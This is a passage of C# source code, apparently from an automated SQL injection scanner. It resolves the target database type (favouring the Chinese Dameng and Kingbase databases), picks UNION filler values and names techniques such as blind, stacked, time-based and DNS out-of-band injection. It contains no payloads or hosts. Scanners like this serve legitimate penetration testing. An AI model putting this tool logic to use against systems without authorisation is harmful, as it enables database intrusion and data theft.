        /// <summary>
        /// 解析数据库：优先用例自带dbms（与指纹候选兼容时以候选国产库为准），否则用错误指纹候选
        /// </summary>
        private static DBType ResolveDb(PayloadTest test, Ctx ctx)
        {
            DBType db = DbmsNameToDbType(test.Dbms);
            //国产库指纹优先：达梦/金仓指纹误报率低，而用例库无国产库专用用例，
            //指纹命中国产库时直接以国产库为准，保证后续取数用国产库模板（DM兼容Oracle、金仓兼容PG）
            foreach (DBType c in ctx.DbCandidates)
            {
                if (c == DBType.DM || c == DBType.Kingbase)
                {
                    return c;
                }
            }
            if (db != DBType.UnKnow)
            {
                //用例是Oracle/PG而指纹是达梦/金仓时，以国产库为准，保证后续取数用国产库模板；无匹配候选时沿用用例库
                foreach (DBType c in ctx.DbCandidates)
                {
                    if (c == db || CompatDb(c) == db)
                    {
                        return c;
                    }
                }
                return db;
            }
            if (ctx.DbCandidates.Count > 0)
            {
                return ctx.DbCandidates[0];
            }
            return db;
        }

        /// <summary>
        /// Union填充字符解析：NULL / [CHAR]随机字符串 / [RANDNUM]随机数字
        /// </summary>
        private static string? ResolveUnionChar(PayloadTest test, PayloadPlaceholder ph)
        {
            string c = test.RequestChar ?? "";
            if (string.IsNullOrWhiteSpace(c) || c.Equals("NULL", StringComparison.OrdinalIgnoreCase))
            {
                return "NULL";
            }
            if (c.Contains("[CHAR]", StringComparison.Ordinal))
            {
                return "'" + ph.RandStr + "'";
            }
            if (c.Contains("[RANDNUM]", StringComparison.Ordinal))
            {
                return ph.RandNum.ToString();
            }
            return ph.Replace(c);
        }

        /// <summary>
        /// DBMS名称 → V2数据库类型（统一查 DbProfile 注册表：fork/衍生库精确映射优先，
        /// 其后归一化双向包含匹配，兼容"Microsoft SQL Server"与"SQLServer"等写法）
        /// </summary>
        private static DBType DbmsNameToDbType(string name)
        {
            return DbProfile.DbTypeForName(name);
        }

        private static DBType ParseDbName(string name)
        {
            if (Enum.TryParse(name, true, out DBType db))
            {
                return db;
            }
            return DbmsNameToDbType(name);
        }

        private static string TechniqueName(int stype)
        {
            return stype switch
            {
                1 => "布尔盲注",
                2 => "报错注入",
                3 => "内联查询",
                4 => "堆叠查询",
                5 => "时间盲注",
                6 => "Union查询",
                7 => "DNS外带探测",
                _ => "未知技术"
            };
        }
    }
}
